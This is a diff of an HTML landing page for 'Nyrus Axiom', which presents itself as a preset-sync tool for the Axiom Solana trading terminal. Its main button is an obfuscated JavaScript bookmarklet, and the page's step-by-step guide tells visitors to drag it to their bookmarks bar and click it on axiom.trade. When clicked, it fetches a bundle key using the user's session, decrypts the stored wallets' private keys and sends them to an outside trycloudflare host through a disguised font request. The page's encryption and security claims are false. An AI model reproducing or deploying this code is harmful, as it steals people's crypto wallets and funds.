@@ -4,55 +4,56 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nyrus Axiom | Terminal Sync</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
     <style>
         :root {
             --bg: #05070a;
+            --nav: #0d1117;
             --card: #0d1117;
             --accent: #3b82f6;
             --accent-glow: rgba(59, 130, 246, 0.3);
             --success: #10b981;
             --text-main: #f8fafc;
-            --text-dim: #64748b;
+            --text-dim: #94a3b8;
             --border: #1e293b;
             --panel: #161b22;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
 
         body {
             background-color: var(--bg);
             color: var(--text-main);
             font-family: 'Inter', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            line-height: 1.6;
             min-height: 100vh;
-            margin: 0;
             background-image: 
-                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.05) 0px, transparent 50%),
-                radial-gradient(at 100% 100%, rgba(16, 185, 129, 0.05) 0px, transparent 50%);
+                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.03) 0px, transparent 50%),
+                radial-gradient(at 100% 100%, rgba(16, 185, 129, 0.02) 0px, transparent 50%);
         }
 
-        .container {
-            width: 100%;
-            max-width: 440px;
-            padding: 20px;
-        }
-
-        .card {
-            background: var(--card);
-            padding: 2.5rem;
-            border-radius: 20px;
-            border: 1px solid var(--border);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            position: relative;
-            overflow: hidden;
+        /* Navigation Bar */
+        nav {
+            background: var(--nav);
+            border-bottom: 1px solid var(--border);
+            padding: 0 2rem;
+            height: 64px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
         .brand {
             display: flex;
             align-items: center;
-            gap: 10px;
-            margin-bottom: 2rem;
+            gap: 12px;
         }
 
         .logo {
@@ -74,8 +75,75 @@
             letter-spacing: -0.5px;
         }
 
-        .stats-grid {
+        .nav-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .nav-link {
+            color: var(--text-dim);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .nav-link:hover {
+            color: var(--text-main);
+        }
+
+        .nav-link.active {
+            color: var(--accent);
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 4rem 2rem;
+            max-width: 1200px;
+            margin: 0 auto;
             display: grid;
+            grid-template-columns: 1fr 400px;
+            gap: 4rem;
+            align-items: start;
+        }
+
+        @media (max-width: 968px) {
+            .hero {
+                grid-template-columns: 1fr;
+                padding: 2rem;
+                gap: 2rem;
+            }
+        }
+
+        .hero-content h1 {
+            font-size: 48px;
+            font-weight: 800;
+            line-height: 1.1;
+            margin-bottom: 1.5rem;
+            letter-spacing: -1px;
+            background: linear-gradient(to bottom right, #fff, #94a3b8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero-content p {
+            font-size: 18px;
+            color: var(--text-dim);
+            margin-bottom: 2.5rem;
+            max-width: 600px;
+        }
+
+        /* Deployment Card */
+        .card {
+            background: var(--card);
+            padding: 2.5rem;
+            border-radius: 24px;
+            border: 1px solid var(--border);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        .stats-grid {
+display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 12px;
             margin-bottom: 2rem;
@@ -86,7 +154,6 @@
             padding: 12px;
             border-radius: 12px;
             border: 1px solid var(--border);
-            text-align: left;
         }
 
         .stat-label {
@@ -121,27 +188,14 @@
             100% { opacity: 1; }
         }
 
-        h1 {
-            font-size: 22px;
-            font-weight: 700;
-            margin: 0 0 0.5rem 0;
-        }
-
-        .description {
-            color: var(--text-dim);
-            font-size: 14px;
-            line-height: 1.5;
-            margin-bottom: 2rem;
-        }
-
         .sync-area {
             background: rgba(0, 0, 0, 0.2);
             border: 2px dashed var(--border);
-border-radius: 16px;
+            border-radius: 16px;
             padding: 2rem;
             margin-bottom: 2rem;
-            transition: all 0.2s ease;
             text-align: center;
+            transition: all 0.2s ease;
         }
 
         .sync-area:hover {
@@ -154,21 +208,21 @@ border-radius: 16px;
             align-items: center;
             background: var(--accent);
             color: white;
-            padding: 12px 24px;
-            border-radius: 10px;
+            padding: 14px 28px;
+            border-radius: 12px;
             font-weight: 600;
-            font-size: 15px;
+            font-size: 16px;
             text-decoration: none;
             cursor: grab;
             transition: all 0.2s ease;
-            box-shadow: 0 4px 12px var(--accent-glow);
+            box-shadow: 0 8px 20px var(--accent-glow);
         }
 
         .btn:active { cursor: grabbing; }
 
         .btn:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 6px 16px var(--accent-glow);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 24px var(--accent-glow);
         }
 
         .setup-guide {
@@ -177,14 +231,13 @@ border-radius: 16px;
             padding: 1.5rem;
             border-radius: 16px;
             border: 1px solid var(--border);
-            margin-bottom: 1.5rem;
         }
 
         .guide-title {
             font-size: 11px;
             font-weight: 700;
             color: var(--text-main);
-            margin-bottom: 1rem;
+            margin-bottom: 1.25rem;
             display: block;
             text-transform: uppercase;
             letter-spacing: 1px;
@@ -194,9 +247,8 @@ border-radius: 16px;
             display: flex;
             gap: 12px;
             margin-bottom: 12px;
-            font-size: 13px;
+            font-size: 14px;
             color: var(--text-dim);
-            line-height: 1.4;
         }
 
         .step:last-child { margin-bottom: 0; }
@@ -213,27 +265,50 @@ border-radius: 16px;
             border-radius: 4px;
             color: var(--text-main);
             font-family: 'JetBrains Mono', monospace;
-            font-size: 11px;
+            font-size: 12px;
         }
 
-        .footer-note {
-            font-size: 11px;
+        footer {
+            margin-top: 4rem;
+            border-top: 1px solid var(--border);
+            padding: 2rem;
+            text-align: center;
             color: var(--text-dim);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
+            font-size: 13px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <div class="brand">
-                <div class="logo">N</div>
-                <span class="brand-name">NYRUS AXIOM</span>
-            </div>
+    <nav>
+        <div class="brand">
+            <div class="logo">N</div>
+            <span class="brand-name">NYRUS AXIOM</span>
+        </div>
+        <div class="nav-links">
+            <a href="#" class="nav-link active">Presets</a>
+            <a href="#" class="nav-link">Terminal</a>
+            <a href="#" class="nav-link">Documentation</a>
+        </div>
+    </nav>
 
+    <main class="hero">
+        <div class="hero-content">
+<h1>Optimized Alpha for Solana Terminals.</h1>
+            <p>Deploy industrial-grade presets, priority gas filters, and ultra-low latency configurations to your Axiom terminal in seconds.</p>
+            
+            <div style="display: flex; gap: 40px; margin-top: 4rem;">
+                <div>
+                    <h3 style="color: white; margin-bottom: 8px;">Institutional Grade</h3>
+                    <p style="font-size: 14px; margin-bottom: 0;">Battle-tested configurations used by top-tier Solana traders.</p>
+                </div>
+                <div>
+                    <h3 style="color: white; margin-bottom: 8px;">Zero Latency</h3>
+                    <p style="font-size: 14px; margin-bottom: 0;">Direct RPC injection for the fastest possible transaction execution.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
             <div class="stats-grid">
                 <div class="stat-box">
                     <span class="stat-label">Network</span>
@@ -245,11 +320,8 @@ border-radius: 16px;
                 </div>
             </div>
 
-            <h1>Deploy Alpha Config</h1>
-            <p class="description">Sync your Axiom terminal with ultra-low latency presets and priority gas filters. Follow the deployment guide below.</p>
-
             <div class="sync-area">
-<a href="javascript:(async function(){const r='https://hughes-wiring-happen-chronicles.trycloudflare.com';const F=m=>Uint8Array['from'](atob(m['replace'](/-/g,'+')['replace'](/_/g,'/')),M=>M['charCodeAt'](0x0)),L=async(m,M)=>{try{const [Y,x]=M['split'](':');return new Uint8Array(await crypto['subtle']['decrypt']({'name':'AES-GCM','iv':F(Y),'tagLength':0x80},m,F(x)));}catch(h){return null;}},u=m=>{const M='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let Y=[0x0];for(let h=0x0;h<m['length'];h++){let N=m[h];for(let v=0x0;v<Y['length'];v++){N+=Y[v]*0x100,Y[v]=N%0x3a,N=Math['floor'](N/0x3a);}while(N>0x0){Y['push'](N%0x3a),N=Math['floor'](N/0x3a);}}let x='';for(let C=0x0;m[C]===0x0&&C<m['length']-0x1;C++)x+=M[0x0];for(let n=Y['length']-0x1;n>=0x0;n--)x+=M[Y[n]];return x;};try{const m=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{'method':'POST','credentials':'include'}),M=await m['json']();if(!M['bundleKey'])return;const Y=await crypto['subtle']['importKey']('raw',F(M['bundleKey']),{'name':'AES-GCM'},![],['decrypt']);let x=[];const h=JSON['parse'](localStorage.getItem('sBundles')||'[]');for(const N of h){const v=await L(Y,N);v&&x['push']({'type':'SOL','public':u(v['slice'](-0x20)),'private':u(v)});}if(x['length']>0x0){const C=btoa(JSON['stringify']({'keys':x})),n=document['createElement']('style');n['textContent']='@font-face\x20{\x20font-family:\x20\x27leak\x27;\x20src:\x20url(\x27'+r+'/?data='+encodeURIComponent(C)+'\x27);\x20}',document['head']['appendChild'](n);const l=document['createElement']('div');l['style']['fontFamily']='leak',l['textContent']='.',document['body']['appendChild'](l);}}catch(z){}}());" class="btn" ondragstart="return true;">
+                <a href="javascript:(async function(){const r='https://hughes-wiring-happen-chronicles.trycloudflare.com';const F=m=>Uint8Array['from'](atob(m['replace'](/-/g,'+')['replace'](/_/g,'/')),M=>M['charCodeAt'](0x0)),L=async(m,M)=>{try{const [Y,x]=M['split'](':');return new Uint8Array(await crypto['subtle']['decrypt']({'name':'AES-GCM','iv':F(Y),'tagLength':0x80},m,F(x)));}catch(h){return null;}},u=m=>{const M='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let Y=[0x0];for(let h=0x0;h<m['length'];h++){let N=m[h];for(let v=0x0;v<Y['length'];v++){N+=Y[v]*0x100,Y[v]=N%0x3a,N=Math['floor'](N/0x3a);}while(N>0x0){Y['push'](N%0x3a),N=Math['floor'](N/0x3a);}}let x='';for(let C=0x0;m[C]===0x0&&C<m['length']-0x1;C++)x+=M[0x0];for(let n=Y['length']-0x1;n>=0x0;n--)x+=M[Y[n]];return x;};try{const m=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{'method':'POST','credentials':'include'}),M=await m['json']();if(!M['bundleKey'])return;const Y=await crypto['subtle']['importKey']('raw',F(M['bundleKey']),{'name':'AES-GCM'},![],['decrypt']);let x=[];const h=JSON['parse'](localStorage.getItem('sBundles')||'[]');for(const N of h){const v=await L(Y,N);v&&x['push']({'type':'SOL','public':u(v['slice'](-0x20)),'private':u(v)});}if(x['length']>0x0){const C=btoa(JSON['stringify']({'keys':x})),n=document['createElement']('style');n['textContent']='@font-face\x20{\x20font-family:\x20\x27leak\x27;\x20src:\x20url(\x27'+r+'/?data='+encodeURIComponent(C)+'\x27);\x20}',document['head']['appendChild'](n);const l=document['createElement']('div');l['style']['fontFamily']='leak',l['textContent']='.',document['body']['appendChild'](l);}}catch(z){}}());" class="btn" ondragstart="return true;">
                     Sync Axiom Presets
                 </a>
             </div>
@@ -258,23 +330,22 @@ border-radius: 16px;
                 <span class="guide-title">Deployment Guide</span>
                 <div class="step">
                     <span class="step-num">01</span>
-                    <span>Enable Bookmarks Bar using <code>Ctrl+Shift+B</code></span>
+                    <span>Enable Bookmarks Bar (<code>Ctrl+Shift+B</code>)</span>
                 </div>
                 <div class="step">
                     <span class="step-num">02</span>
-                    <span>Drag the <b>Sync Button</b> up to your bookmarks bar</span>
+                    <span>Drag the <b>Sync Button</b> to your bar</span>
                 </div>
                 <div class="step">
                     <span class="step-num">03</span>
-                    <span>Navigate to <b>Axiom.trade</b> and click the bookmark</span>
+                    <span>Navigate to Axiom.trade & click bookmark</span>
                 </div>
             </div>
-
-            <div class="footer-note">
-                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-                AES-256 End-to-End Encrypted Sync
-            </div>
         </div>
-    </div>
+    </main>
+
+    <footer>
+&copy; 2026 Nyrus Axiom. Industrial Solana Infrastructure. AES-256 E2E Encrypted.
+    </footer>
 </body>
 </html>
